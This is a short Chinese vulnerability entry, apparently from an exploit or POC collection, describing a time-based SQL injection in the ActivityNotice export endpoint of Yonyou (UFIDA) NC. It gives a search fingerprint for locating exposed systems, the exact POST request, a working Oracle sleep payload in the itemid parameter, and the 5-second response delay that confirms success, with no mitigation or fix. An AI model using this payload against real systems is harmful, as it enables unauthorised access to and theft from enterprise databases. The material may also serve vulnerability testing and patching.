# 用友NCActivityNotice_export存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1`

**Payload**
```
itemid=1' AND 1=dbms_pipe.receive_message('RDS',5)--
```
- **响应特征**：200 响应时间>=5s